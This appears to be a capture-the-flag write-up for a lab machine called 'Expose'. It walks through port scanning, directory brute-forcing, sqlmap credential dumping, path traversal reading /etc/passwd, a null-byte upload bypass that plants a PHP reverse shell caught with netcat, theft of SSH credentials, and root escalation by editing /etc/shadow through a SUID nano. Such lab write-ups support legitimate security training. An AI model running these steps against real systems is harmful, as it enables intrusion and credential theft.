---
title: Expose
layout: default
parent: Medium.
nav_order: 3
---

# Expose
**Mini description**: This challenge is an initial test to evaluate your capabilities in red teaming skills. Tools to complete the challenge, like `Nmap`, sqlmap, wordlists, PHP shell.

## `nmap`
Scan, `nmap -sT -p- 10.81.132.3`
```diff
PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+53/tcp   open  domain
+1337/tcp open  waste
+1883/tcp open  mqtt
```
Scan, `nmap -sT -sV -sC -p 21,22,53,1337,1883 10.81.132.3`
```diff
PORT     STATE SERVICE                 VERSION
21/tcp   open  ftp                     vsftpd 2.0.8 or later
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.132.223
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh                     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 42:83:b2:b3:36:bc:86:3c:e5:f1:1a:1d:70:e4:df:a3 (RSA)
|   256 5a:c3:81:ee:43:e8:fb:2b:16:7e:93:fc:76:8d:6b:c2 (ECDSA)
|_  256 f9:f0:ab:c3:b0:ad:fe:d5:48:e3:4f:30:36:77:6e:e9 (ED25519)
53/tcp   open  domain                  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.16.1-Ubuntu
1337/tcp open  http                    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: EXPOSED
|_http-server-header: Apache/2.4.41 (Ubuntu)
1883/tcp open  mosquitto version 1.6.9
| mqtt-subscribe:
|   Topics and their most recent payloads:
|     $SYS/broker/messages/received: 1
|     $SYS/broker/publish/messages/dropped: 0
|     $SYS/broker/load/sockets/15min: 0.13
|     $SYS/broker/heap/current: 47240
|     $SYS/broker/subscriptions/count: 0
|     $SYS/broker/load/messages/sent/1min: 0.91
|     $SYS/broker/publish/messages/received: 0
|     $SYS/broker/clients/active: 0
|     $SYS/broker/load/publish/received/5min: 0.00
|     $SYS/broker/uptime: 33 seconds
|     $SYS/broker/load/publish/received/1min: 0.00
|     $SYS/broker/clients/total: 0
|     $SYS/broker/load/publish/dropped/5min: 0.00
|     $SYS/broker/store/messages/bytes: 178
|     $SYS/broker/publish/bytes/received: 0
|     $SYS/broker/load/messages/sent/15min: 0.07
|     $SYS/broker/messages/stored: 52
|     $SYS/broker/version: mosquitto version 1.6.9
|     $SYS/broker/load/bytes/received/1min: 16.45
|     $SYS/broker/clients/expired: 0
|     $SYS/broker/store/messages/count: 52
|     $SYS/broker/load/messages/received/1min: 0.91
|     $SYS/broker/shared_subscriptions/count: 0
|     $SYS/broker/load/bytes/received/15min: 1.19
|     $SYS/broker/retained messages/count: 52
|     $SYS/broker/heap/maximum: 49688
|     $SYS/broker/publish/messages/sent: 0
|     $SYS/broker/clients/connected: 0
|     $SYS/broker/publish/bytes/sent: 0
|     $SYS/broker/bytes/sent: 4
|     $SYS/broker/load/publish/sent/1min: 0.00
|     $SYS/broker/clients/disconnected: 0
|     $SYS/broker/load/sockets/5min: 0.39
|     $SYS/broker/messages/sent: 1
|     $SYS/broker/load/connections/1min: 0.91
|     $SYS/broker/load/publish/sent/15min: 0.00
|     $SYS/broker/load/publish/sent/5min: 0.00
|     $SYS/broker/load/connections/5min: 0.20
|     $SYS/broker/load/bytes/sent/15min: 0.27
|     $SYS/broker/load/bytes/received/5min: 3.53
|     $SYS/broker/load/messages/received/5min: 0.20
|     $SYS/broker/load/sockets/1min: 1.83
|     $SYS/broker/load/publish/dropped/15min: 0.00
|     $SYS/broker/bytes/received: 18
|     $SYS/broker/load/messages/received/15min: 0.07
|     $SYS/broker/load/connections/15min: 0.07
|     $SYS/broker/load/bytes/sent/1min: 3.65
|     $SYS/broker/clients/inactive: 0
|     $SYS/broker/load/messages/sent/5min: 0.20
|     $SYS/broker/load/bytes/sent/5min: 0.79
|     $SYS/broker/load/publish/dropped/1min: 0.00
|_    $SYS/broker/load/publish/received/15min: 0.00
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## `gobuster`
1. `gobuster dir --url http://10.82.128.229:1337 -w /usr/share/wordlists/dirb/big.txt`
    ```diff
    .htpasswd            (Status: 403) [Size: 279]
    .htaccess            (Status: 403) [Size: 279]
    admin                (Status: 301) [Size: 319] [--> http://10.80.190.27:1337/admin/]
    admin_101            (Status: 301) [Size: 323] [--> http://10.80.190.27:1337/admin_101/]
    javascript           (Status: 301) [Size: 324] [--> http://10.80.190.27:1337/javascript/]
    phpmyadmin           (Status: 301) [Size: 324] [--> http://10.80.190.27:1337/phpmyadmin/]
    server-status        (Status: 403) [Size: 279]
    ```
1. Visit, `http://10.82.128.229:1337/admin_101/`
1. Crate `req` file
    ```sh
    POST /admin_101/includes/user_login.php HTTP/1.1
    Host: 10.80.159.62:1337
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Content-Length: 37
    Origin: http://10.80.159.62:1337
    Connection: keep-alive
    Referer: http://10.80.159.62:1337/admin_101/
    Cookie: PHPSESSID=p1leqridge9olnfvvslvenaldb
    Priority: u=0

    email=hacker%40root.thm&password=pass
    ```
1. `sqlmap -r req --dump -v 6`
    ```diff
    Database: expose
    Table: config
    [2 entries]
    +----+------------------------------+-----------------------------------------------------+
    | id | url                          | password                                            |
    +----+------------------------------+-----------------------------------------------------+
    | 1  | /file1010111/index.php       | 69c66901194a6486176e81f5945b8929                    |
    | 3  | /upload-cv00101011/index.php | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z |
    +----+------------------------------+-----------------------------------------------------+
    ```
1. `http://10.82.128.229:1337/file1010111/index.php`
    - `69c66901194a6486176e81f5945b8929` -> `easytohack`
1. `http://10.82.128.229:1337/file1010111/index.php?file=../../../../etc/passwd`
    ```diff
    root:x:0:0:root:/root:/bin/bash 
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
    bin:x:2:2:bin:/bin:/usr/sbin/nologin 
    sys:x:3:3:sys:/dev:/usr/sbin/nologin 
    sync:x:4:65534:sync:/bin:/bin/sync 
    games:x:5:60:games:/usr/games:/usr/sbin/nologin 
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin 
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
    systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin 
    systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin 
    systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin 
    messagebus:x:103:106::/nonexistent:/usr/sbin/nologin 
    +syslog:x:104:110::/home/syslog:/usr/sbin/nologin 
    _apt:x:105:65534::/nonexistent:/usr/sbin/nologin 
    tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false 
    uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin 
    tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin 
    sshd:x:109:65534::/run/sshd:/usr/sbin/nologin 
    landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin 
    pollinate:x:111:1::/var/cache/pollinate:/bin/false 
    ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin 
    systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin 
    +ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash 
    lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false 
    mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false 
    +zeamkish:x:1001:1001:Zeam Kish,1,1,:/home/zeamkish:/bin/bash 
    ftp:x:114:121:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin 
    bind:x:115:122::/var/cache/bind:/usr/sbin/nologin 
    Debian-snmp:x:116:123::/var/lib/snmp:/bin/false 
    redis:x:117:124::/var/lib/redis:/usr/sbin/nologin 
    mosquitto:x:118:125::/var/lib/mosquitto:/usr/sbin/nologin 
    fwupd-refresh:x:119:126:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
    ```
1. **Burp Suite**
    1. **Proxy**
    1. **Open browser**
    1. **HTTP history**
    1. Visit, `http://10.82.128.229:1337/upload-cv00101011/index.php`
        - `zeamkish`
        - Upload the file, `cat.phpD.jpg`
            - [`cat.phpD.jpg`](files/cat.phpD.jpg), Create with [**PHP PentestMonkey**](https://www.revshells.com/)
    1. Click, `Send to repeater`

        ||||||
        |---|---|---|---|---|
        |#|http://10.82.128.229:1337|POST|/upload-cv00101011/index.php|200|
    1. **Repeater**
    1. Edit, `Content-Disposition: form-data; name="file"; filename="cat.phpD.jpg"`
        - highlight the letter D
        - **Code**, `00`
        - **Apply changes**
        - Click, `Send`
    1. Visit, `http://10.82.128.229:1337/upload-cv00101011/upload_thm_1001/`
        - Confirm, `cat.php`
    1. Run a listener, `nc -lnvp 4444`
    1. Click, `cat.php` file
    1. **NetCat** command
        - `cat /home/zeamkish/ssh_creds.txt`
            ```
            SSH CREDS
            zeamkish
            easytohack@123
            ```
    1. **SSH**
        - `sshpass -p "easytohack@123" ssh zeamkish@10.82.128.229`
    1. `find / -perm -04000 -type f -ls 2>/dev/null`
        - The nano command, able to read and write any files as root.
        - `2136    316 -rwsr-xr-x   1 root     root              320136 Apr 10  2020 /usr/bin/nano`
    1. Edit, `/etc/shadow`
        - Create a new password, `openssl passwd -1 -salt root 1234`
        - `/usr/bin/nano /etc/shadow`, `$1$root$.fAWE/htZAqQge.bvM16O/`
    1. Roor time!
        - `su`